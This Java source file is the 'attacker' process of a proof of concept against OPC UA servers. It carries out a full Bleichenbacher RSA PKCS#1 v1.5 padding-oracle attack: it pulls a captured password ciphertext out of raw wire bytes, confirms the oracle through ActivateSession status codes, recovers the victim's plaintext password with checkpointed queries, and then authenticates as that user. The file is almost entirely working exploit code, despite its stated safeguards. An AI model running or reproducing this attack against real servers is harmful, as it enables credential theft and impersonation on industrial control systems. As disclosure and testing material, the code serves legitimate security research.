package poc;

import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.List;
import java.util.Objects;
import java.util.Properties;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import org.eclipse.milo.opcua.sdk.client.DiscoveryClient;
import org.eclipse.milo.opcua.sdk.client.OpcUaClient;
import org.eclipse.milo.opcua.stack.core.AttributeId;
import org.eclipse.milo.opcua.stack.core.StatusCodes;
import org.eclipse.milo.opcua.stack.core.channel.SecureChannel;
import org.eclipse.milo.opcua.stack.core.security.SecurityAlgorithm;
import org.eclipse.milo.opcua.stack.core.security.SecurityPolicy;
import org.eclipse.milo.opcua.stack.core.types.UaResponseMessageType;
import org.eclipse.milo.opcua.stack.core.types.builtin.ByteString;
import org.eclipse.milo.opcua.stack.core.types.builtin.NodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.QualifiedName;
import org.eclipse.milo.opcua.stack.core.types.builtin.StatusCode;
import org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.UInteger;
import org.eclipse.milo.opcua.stack.core.types.enumerated.TimestampsToReturn;
import org.eclipse.milo.opcua.stack.core.types.structured.EndpointDescription;
import org.eclipse.milo.opcua.stack.core.types.structured.ReadRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.ReadResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.ReadValueId;
import org.eclipse.milo.opcua.stack.core.types.structured.UserTokenPolicy;
import org.eclipse.milo.opcua.stack.core.util.CertificateUtil;
import poc.common.Args;
import poc.common.BleichenbacherEngine;
import poc.common.PropsFile;
import poc.common.RawActivate;
import poc.common.WireCodec;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Process 4 of 5: THE ATTACKER.
 *
 * <p><b>Isolation property (audit this):</b> this class never reads, receives, or references the
 * victim's password by any channel -- not as a CLI argument, not from an environment variable, not
 * from a system property, not from any file it opens. Grep this file: there is no variable named
 * anything like "password" that holds the victim's real secret; the only "password" strings that
 * appear are (a) throwaway probe strings this process invents itself to build oracle-confirmation
 * ciphertexts, and (b) the RECOVERED candidate this process derives purely from remote oracle
 * responses. It also never touches a private key and never calls {@code Cipher.DECRYPT_MODE}
 * anywhere -- {@link RawActivate#encryptToken} is public-key encryption; every padding-validity
 * decision comes from a real {@code ActivateSession} response read off a socket in {@link
 * WireOracle}.
 *
 * <p>Inputs, exactly as specified: target host/port, and EITHER a raw wire capture (two files of
 * unmodified TCP bytes, one per direction, written by {@code poc.RelayMain}) OR an already-
 * extracted ciphertext (hex) with an explicit username/policyId for manual/offline use. Nothing
 * else. When given a raw capture, THIS CLASS -- not the relay -- decodes the UASC framing and the
 * {@code ActivateSessionRequest} to pull out the username, policyId, and password ciphertext (see
 * {@link #extractFromRawCapture}); it also independently re-derives the certificate the capture
 * was made against from the raw server-&gt;client bytes, rather than trusting a value handed to
 * it by another process. The server's LIVE certificate is fetched by this class itself via an
 * ordinary {@code GetEndpoints} call, exactly as any attacker would.
 */
public class AttackerMain {

  private static final Logger LOGGER = LoggerFactory.getLogger(AttackerMain.class);

  // Exit codes, used by run.sh to decide whether to resume, refuse, or stop.
  private static final int EXIT_OK = 0;
  private static final int EXIT_ERROR = 1;
  private static final int EXIT_CERT_MISMATCH = 3;
  private static final int EXIT_NOT_VULNERABLE = 4;
  private static final int EXIT_INCOMPLETE_RESUME = 5;
  private static final int EXIT_IMPERSONATION_FAILED = 6;
  private static final int EXIT_NO_POLICY = 7;

  public static void main(String[] args) {
    int code;
    try {
      code = run(Args.parse(args));
    } catch (Exception e) {
      LOGGER.error("[-] attacker process failed: {}", e.toString(), e);
      code = EXIT_ERROR;
    }
    System.exit(code);
  }

  private static int run(Args a) throws Exception {
    String host = a.get("host", "localhost");
    int port = a.getInt("port", -1);
    if (port <= 0) throw new IllegalArgumentException("--port is required");

    long maxQueries = a.getLong("max-queries", 0);
    long maxRuntimeSeconds = a.getLong("max-runtime", 300);
    int window = a.getInt("window", 48);
    long checkpointEvery = a.getLong("checkpoint-every", 1000);
    String checkpointFile = a.require("checkpoint-file");
    String outFile = a.require("out-file");

    // ---------- STEP 1: discover + validate (never infer vulnerability from a version string) ----------
    String discoveryUrl = "opc.tcp://" + host + ":" + port + "/test";
    List<EndpointDescription> endpoints = DiscoveryClient.getEndpoints(discoveryUrl).get(15, TimeUnit.SECONDS);

    EndpointDescription noneEp =
        endpoints.stream()
            .filter(ep -> SecurityPolicy.None.getUri().equals(ep.getSecurityPolicyUri()))
            .findFirst()
            .orElseThrow(() -> new IllegalStateException("no None endpoint found at " + discoveryUrl));

    X509Certificate serverCert =
        CertificateUtil.decodeCertificates(noneEp.getServerCertificate().bytesOrEmpty()).get(0);
    String liveCertFingerprint = WireCodec.certFingerprintSha256(serverCert);
    System.out.println("[*] Live server certificate SHA-256: " + liveCertFingerprint);

    int blockSize = SecureChannel.getAsymmetricCipherTextBlockSize(serverCert, SecurityAlgorithm.Rsa15);

    // ---------- STEP 2: acquire username/policyId/ciphertext -- by parsing the raw capture
    // ourselves (the default path), or from explicit manual inputs. Either way, this class does
    // the extraction; nothing hands it a pre-extracted result. ----------
    String username;
    String policyId;
    byte[] c0Bytes;
    String capturedCertFingerprint = null; // null = no independent capture-time cert available

    String manualTokenHex = a.get("token-hex", null);
    if (manualTokenHex != null) {
      username = a.require("username");
      policyId = a.get("policy-id", "username_rsa15");
      c0Bytes = WireCodec.fromHex(manualTokenHex);
      String manualCertHex = a.get("server-cert-hex", null);
      if (manualCertHex != null) {
        capturedCertFingerprint = WireCodec.sha256Hex(WireCodec.fromHex(manualCertHex));
      }
      LOGGER.info("[*] Using manually-supplied ciphertext (--token-hex), not a raw capture");
    } else {
      Path c2sPath = Path.of(a.require("capture-c2s-file"));
      byte[] c2sRaw = Files.readAllBytes(c2sPath);
      LOGGER.info("[*] Parsing raw capture ourselves: {} client->server bytes from {}", c2sRaw.length, c2sPath);
      WireCodec.ExtractedToken extracted = extractFromRawCapture(c2sRaw, blockSize);
      if (extracted == null) {
        System.out.println(
            "[-] Could not extract an ActivateSessionRequest password ciphertext of "
                + blockSize
                + " bytes from the raw capture -- wrong capture, wrong target, or nothing captured.");
        return EXIT_ERROR;
      }
      username = extracted.username;
      policyId = extracted.policyId;
      c0Bytes = extracted.ciphertext;

      String s2cFileArg = a.get("capture-s2c-file", null);
      if (s2cFileArg != null) {
        byte[] s2cRaw = Files.readAllBytes(Path.of(s2cFileArg));
        byte[] capturedCertDer = WireCodec.extractServerCertificateFromStream(s2cRaw);
        if (capturedCertDer != null) {
          capturedCertFingerprint = WireCodec.sha256Hex(capturedCertDer);
          LOGGER.info(
              "[*] Extracted the server certificate presented during the captured session from the"
                  + " raw server->client bytes ourselves; SHA-256={}",
              capturedCertFingerprint);
        } else {
          LOGGER.warn(
              "[*] Could not find a CreateSessionResponse in the server->client capture; skipping"
                  + " the certificate-binding check for this run");
        }
      }
    }

    System.out.println(
        "[*] Extracted from capture: username=" + username + ", policyId=" + policyId);
    LOGGER.info("[*] Extracted ciphertext SHA-256: {}", WireCodec.sha256Hex(c0Bytes));
    System.out.println("[*] Captured token SHA-256: " + WireCodec.sha256Hex(c0Bytes));

    boolean policyFound =
        java.util.Arrays.stream(noneEp.getUserIdentityTokens())
            .anyMatch(
                p ->
                    policyId.equals(p.getPolicyId())
                        && SecurityPolicy.Basic128Rsa15.getUri().equals(p.getSecurityPolicyUri()));
    if (!policyFound) {
      System.out.println("[-] No Basic128Rsa15 username policy (" + policyId + ") found at target");
      return EXIT_NO_POLICY;
    }
    System.out.println("[+] Basic128Rsa15 username policy found");

    if (c0Bytes.length != blockSize) {
      System.out.println(
          "[-] REFUSING: captured token is "
              + c0Bytes.length
              + " bytes but the live server's RSA block size is "
              + blockSize
              + " bytes");
      return EXIT_CERT_MISMATCH;
    }

    // ---------- Certificate-binding control (only when we have an independently-derived
    // capture-time fingerprint to compare against; see extraction above) ----------
    if (capturedCertFingerprint != null && !Objects.equals(liveCertFingerprint, capturedCertFingerprint)) {
      System.out.println(
          "[-] REFUSING: captured token was encrypted to a different server certificate"
              + " (capture was made against "
              + capturedCertFingerprint
              + ", live target is "
              + liveCertFingerprint
              + "). A token encrypted to a rotated/different key is not a valid target.");
      return EXIT_CERT_MISMATCH;
    }

    // ---------- STEP 2: connect anonymously (no credentials at all) ----------
    OpcUaClient attacker = connectAnonymous(noneEp.getEndpointUrl());
    try {
      NodeId authToken = attacker.getSession().getAuthenticationToken();
      ByteString serverNonce = attacker.getSession().getServerNonce();

      // ---------- Confirm the oracle on the wire, cheaply, before attempting recovery ----------
      SecureRandom rnd = new SecureRandom();
      byte[] validPaddingWrongPwCt =
          RawActivate.encryptToken(
              serverCert, "attacker-oracle-probe-" + rnd.nextLong(), serverNonce.bytesOrEmpty());
      StatusCode sValidWrongPw =
          RawActivate.rawActivate(attacker, authToken, policyId, username, validPaddingWrongPwCt);

      byte[] randomCt = new byte[blockSize];
      rnd.nextBytes(randomCt);
      StatusCode sRandom = RawActivate.rawActivate(attacker, authToken, policyId, username, randomCt);

      LOGGER.info(
          "oracle-confirm: valid-padding/wrong-password -> {}; invalid-padding/random -> {}",
          RawActivate.describe(sValidWrongPw),
          RawActivate.describe(sRandom));

      boolean oracleConfirmed =
          sValidWrongPw.getValue() == StatusCodes.Bad_UserAccessDenied
              && sRandom.getValue() == StatusCodes.Bad_SecurityChecksFailed
              && sValidWrongPw.getValue() != sRandom.getValue();

      if (!oracleConfirmed) {
        if (sValidWrongPw.getValue() == sRandom.getValue()) {
          System.out.println(
              "[-] Server response is UNIFORM for valid- and invalid-padding ciphertexts (both -> "
                  + RawActivate.describe(sRandom)
                  + "). Target does NOT appear vulnerable; refusing to attempt recovery.");
        } else {
          System.out.println(
              "[-] Unexpected oracle response pattern (valid/wrong-pw -> "
                  + RawActivate.describe(sValidWrongPw)
                  + ", invalid/random -> "
                  + RawActivate.describe(sRandom)
                  + "). Treating as UNKNOWN, not as a confirmed oracle; refusing to attempt recovery.");
        }
        return EXIT_NOT_VULNERABLE;
      }
      System.out.println(
          "[+] Padding oracle confirmed (valid-padding/wrong-password -> Bad_UserAccessDenied,"
              + " invalid-padding -> Bad_SecurityChecksFailed)");

      // ---------- Sanity: the captured genuine ciphertext must itself read as conforming ----------
      WireOracle oracle = new WireOracle(attacker, authToken, policyId, username, window);
      if (!oracle.isConforming(c0Bytes)) {
        System.out.println(
            "[-] Captured token does not read as PKCS#1 v1.5-conforming over the wire -- wrong"
                + " capture or wrong target; aborting.");
        return EXIT_ERROR;
      }

      // ---------- STEP 3: recovery (checkpointed, resumable) ----------
      String tokenHash = WireCodec.sha256Hex(c0Bytes);
      Path cpPath = Path.of(checkpointFile);
      BleichenbacherEngine.Checkpoint checkpoint;
      if (PropsFile.exists(cpPath)) {
        checkpoint = BleichenbacherEngine.Checkpoint.fromProperties(PropsFile.load(cpPath));
        if (!tokenHash.equals(checkpoint.tokenHash)
            || !liveCertFingerprint.equals(checkpoint.certFingerprint)) {
          LOGGER.warn(
              "[*] Existing checkpoint does not match this token/certificate; starting a fresh search");
          checkpoint = new BleichenbacherEngine.Checkpoint();
        } else {
          LOGGER.info(
              "[*] Resuming from checkpoint: phase={}, {} queries already spent, {} s already elapsed",
              checkpoint.phase,
              checkpoint.queryCount,
              String.format("%.1f", checkpoint.elapsedSeconds));
          System.out.println(
              "[*] Resuming from checkpoint ("
                  + checkpoint.queryCount
                  + " queries already spent)");
        }
      } else {
        checkpoint = new BleichenbacherEngine.Checkpoint();
      }
      checkpoint.certFingerprint = liveCertFingerprint;
      checkpoint.tokenHash = tokenHash;

      java.security.interfaces.RSAPublicKey pub =
          (java.security.interfaces.RSAPublicKey) serverCert.getPublicKey();
      BigInteger n = pub.getModulus();
      BigInteger e = pub.getPublicExponent();

      final BleichenbacherEngine.Checkpoint cpForSink = checkpoint;
      BleichenbacherEngine engine =
          new BleichenbacherEngine(
              n,
              e,
              blockSize,
              window,
              oracle,
              maxQueries,
              maxRuntimeSeconds * 1000L,
              snapshot -> PropsFile.store(cpPath, snapshot.toProperties(), "the padding oracle attacker checkpoint"),
              checkpointEvery);

      BigInteger c0 = WireCodec.os2ip(c0Bytes);
      BleichenbacherEngine.Result result = engine.recover(c0, checkpoint);
      PropsFile.store(cpPath, checkpoint.toProperties(), "the padding oracle attacker checkpoint");

      if (!result.complete) {
        System.out.println(
            "[*] Recovery incomplete after this invocation's budget: "
                + result.queriesThisInvocation
                + " queries / "
                + String.format("%.1f", result.secondsThisInvocation)
                + " s this run ("
                + result.totalQueries
                + " total queries so far, interval width now 2^"
                + result.remainingWidthBits
                + "). Re-run with --checkpoint-file "
                + checkpointFile
                + " to resume.");
        return EXIT_INCOMPLETE_RESUME;
      }

      LOGGER.info(
          "==== RECOVERY COMPLETE: {} total oracle queries, {} s total wall-clock ====",
          result.totalQueries,
          String.format("%.1f", checkpoint.elapsedSeconds));
      System.out.println(
          "[*] Recovery complete: "
              + result.totalQueries
              + " queries in "
              + String.format("%.1f", checkpoint.elapsedSeconds)
              + " seconds");

      // ---------- STEP 4: parse recovered plaintext ----------
      RecoveredToken token = parseRecoveredBlock(result.plaintext, blockSize);

      // ---------- STEP 5: prove (fresh auth attempts; NO node writes, NO method calls) ----------
      byte[] wrongCt =
          RawActivate.encryptToken(
              serverCert, "totally-wrong-password-" + rnd.nextLong(), serverNonce.bytesOrEmpty());
      StatusCode deniedStatus = RawActivate.rawActivate(attacker, authToken, policyId, username, wrongCt);
      boolean wrongDenied = deniedStatus.getValue() == StatusCodes.Bad_UserAccessDenied;
      if (wrongDenied) {
        System.out.println("[+] Wrong-password control denied");
      } else {
        System.out.println("[-] Wrong-password control did NOT deny (" + RawActivate.describe(deniedStatus) + ")");
      }

      byte[] goodCt = RawActivate.encryptToken(serverCert, token.password, serverNonce.bytesOrEmpty());
      StatusCode goodStatus = RawActivate.rawActivate(attacker, authToken, policyId, username, goodCt);
      boolean impersonationGood = goodStatus.isGood();
      if (impersonationGood) {
        System.out.println("[+] Recovered-password authentication succeeded");
        // Prove the session is usable -- read ONE harmless node. Never write/call.
        try {
          ReadRequest rr =
              new ReadRequest(
                  attacker.newRequestHeader(authToken),
                  0.0,
                  TimestampsToReturn.Neither,
                  new ReadValueId[] {
                    new ReadValueId(NodeId.parse("i=2259"), AttributeId.Value.uid(), null, QualifiedName.NULL_VALUE)
                  });
          attacker.getTransport().sendRequestMessage(rr).get(15, TimeUnit.SECONDS);
        } catch (Exception ignore) {
        }
      } else {
        System.out.println(
            "[-] Recovered-password authentication did NOT succeed (" + RawActivate.describe(goodStatus) + ")");
      }

      Properties out = new Properties();
      out.setProperty("recoveredPassword", token.password);
      out.setProperty("recoveredHex", WireCodec.toHex(token.password.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
      out.setProperty("queries", Long.toString(result.totalQueries));
      out.setProperty("wallSeconds", String.format("%.1f", checkpoint.elapsedSeconds));
      out.setProperty("impersonation", impersonationGood ? "Good" : "Denied");
      out.setProperty("wrongPasswordDenied", Boolean.toString(wrongDenied));
      PropsFile.store(Path.of(outFile), out, "the padding oracle attacker result (recovered value only; no ground truth)");

      return (impersonationGood && wrongDenied) ? EXIT_OK : EXIT_IMPERSONATION_FAILED;
    } finally {
      try {
        attacker.disconnectAsync().get(5, TimeUnit.SECONDS);
      } catch (Exception ignore) {
      }
    }
  }

  /**
   * Parses the RAW client-&gt;server bytes recorded by {@code poc.RelayMain} to pull out the
   * {@code ActivateSessionRequest}'s username, policyId, and encrypted password field. This is
   * the actual extraction step -- the relay hands over unmodified TCP bytes, and this is where
   * they get decoded. Delegates to {@link WireCodec#extractPasswordCiphertextFromStream}, which
   * implements the UASC-chunk scan and OPC UA binary decode; kept as a named method here so the
   * class-level javadoc can point at the exact place this happens.
   */
  private static WireCodec.ExtractedToken extractFromRawCapture(byte[] c2sRaw, int blockSize) {
    return WireCodec.extractPasswordCiphertextFromStream(c2sRaw, blockSize);
  }

  private static OpcUaClient connectAnonymous(String endpointUrl) throws Exception {
    OpcUaClient client =
        OpcUaClient.create(
            endpointUrl,
            eps -> eps.stream().filter(e -> SecurityPolicy.None.getUri().equals(e.getSecurityPolicyUri())).findFirst(),
            tcfg -> {},
            ccfg -> ccfg.setRequestTimeout(UInteger.valueOf(120_000)));
    client.connect();
    return client;
  }

  private static final class RecoveredToken {
    final String password;

    RecoveredToken(String password) {
      this.password = password;
    }
  }

  private static RecoveredToken parseRecoveredBlock(BigInteger m, int k) {
    byte[] block = WireCodec.i2osp(m, k);
    if ((block[0] & 0xFF) != 0x00 || (block[1] & 0xFF) != 0x02) {
      throw new AssertionError("recovered block does not start with 00 02");
    }
    int sep = -1;
    for (int i = 2; i < block.length; i++) {
      if (block[i] == 0x00) {
        sep = i;
        break;
      }
    }
    if (sep < 10) {
      throw new AssertionError("0x00 separator not found after >=8 padding bytes");
    }
    int dataLen = block.length - sep - 1;
    byte[] data = new byte[dataLen];
    System.arraycopy(block, sep + 1, data, 0, dataLen);

    ByteBuffer buf = ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN);
    int lengthField = buf.getInt();
    int nonceLen = 32;
    int pwLen = lengthField - nonceLen;
    if (pwLen < 0 || pwLen > data.length - 4) {
      throw new AssertionError("insane recovered password length: " + pwLen);
    }
    byte[] pw = new byte[pwLen];
    buf.get(pw);
    return new RecoveredToken(new String(pw, java.nio.charset.StandardCharsets.UTF_8));
  }

  /** Drives PKCS#1 v1.5 padding-validity queries as real ActivateSession round-trips. */
  private static final class WireOracle implements BleichenbacherEngine.Oracle {
    private final OpcUaClient client;
    private final NodeId authToken;
    private final String policyId;
    private final String username;
    private final int window;
    private long queries = 0;
    private volatile long lastKeepalive = System.currentTimeMillis();
    private static final long KEEPALIVE_INTERVAL_MS = 20_000;

    WireOracle(OpcUaClient client, NodeId authToken, String policyId, String username, int window) {
      this.client = client;
      this.authToken = authToken;
      this.policyId = policyId;
      this.username = username;
      this.window = window;
    }

    boolean isConforming(byte[] ciphertext) throws Exception {
      StatusCode s = queryWithRetry(ciphertext);
      queries++;
      return s.getValue() != StatusCodes.Bad_SecurityChecksFailed;
    }

    @Override
    public boolean[] batchConforming(byte[][] ciphertexts) throws Exception {
      keepaliveIfNeeded();
      int k = ciphertexts.length;
      boolean[] out = new boolean[k];
      @SuppressWarnings("unchecked")
      CompletableFuture<StatusCode>[] futs = new CompletableFuture[k];
      for (int i = 0; i < k; i++) {
        futs[i] = RawActivate.rawActivateAsync(client, authToken, policyId, username, ciphertexts[i]);
      }
      for (int i = 0; i < k; i++) {
        StatusCode s;
        try {
          s = futs[i].get(60, TimeUnit.SECONDS);
        } catch (Exception ex) {
          // A timeout/transport error is UNKNOWN, never "padding valid": retry once synchronously,
          // then fail loudly rather than silently corrupting the interval math with a guess.
          s = queryWithRetry(ciphertexts[i]);
        }
        out[i] = s.getValue() != StatusCodes.Bad_SecurityChecksFailed;
      }
      queries += k;
      return out;
    }

    private StatusCode queryWithRetry(byte[] ciphertext) throws Exception {
      Exception last = null;
      for (int attempt = 0; attempt < 3; attempt++) {
        try {
          return RawActivate.rawActivate(client, authToken, policyId, username, ciphertext);
        } catch (Exception ex) {
          last = ex;
        }
      }
      throw new IllegalStateException("oracle query failed 3 times in a row -- refusing to guess", last);
    }

    private void keepaliveIfNeeded() {
      long now = System.currentTimeMillis();
      if (now - lastKeepalive >= KEEPALIVE_INTERVAL_MS) {
        lastKeepalive = now;
        try {
          ReadRequest rr =
              new ReadRequest(
                  client.newRequestHeader(authToken),
                  0.0,
                  TimestampsToReturn.Neither,
                  new ReadValueId[] {
                    new ReadValueId(NodeId.parse("i=2259"), AttributeId.Value.uid(), null, QualifiedName.NULL_VALUE)
                  });
          UaResponseMessageType resp = client.getTransport().sendRequestMessage(rr).get(30, TimeUnit.SECONDS);
          if (resp instanceof ReadResponse) {
            LOGGER.info("  [keepalive] session activity refreshed at {} queries", queries);
          }
        } catch (Exception ex) {
          LOGGER.warn("  [keepalive] failed: {}", ex.toString());
        }
      }
    }
  }
}
